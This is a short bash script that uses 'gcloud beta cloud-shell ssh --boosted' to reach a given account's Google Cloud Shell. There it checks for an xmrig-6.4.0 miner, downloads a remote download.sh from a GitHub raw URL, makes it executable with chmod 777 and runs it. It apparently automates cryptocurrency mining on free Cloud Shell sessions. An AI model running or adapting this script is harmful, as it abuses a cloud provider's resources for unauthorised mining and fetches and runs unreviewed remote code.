#!/bin/bash

conta=$1

command=""
command=" ${command} [ ! -e 'xmrig-6.4.0/xmrig' ] &&"
command=" ${command} wget -q -N https://raw.githubusercontent.com/robotpack/scripts/GAM/download.sh &&"
command=" ${command} chmod 777 download.sh &&" 
command=" ${command} ./download.sh $conta &&"
command=" ${command} sleep 1 ; exit"

gcloud beta cloud-shell ssh --boosted --command="$command" --account=$conta --authorize-session --force-key-file-overwrite
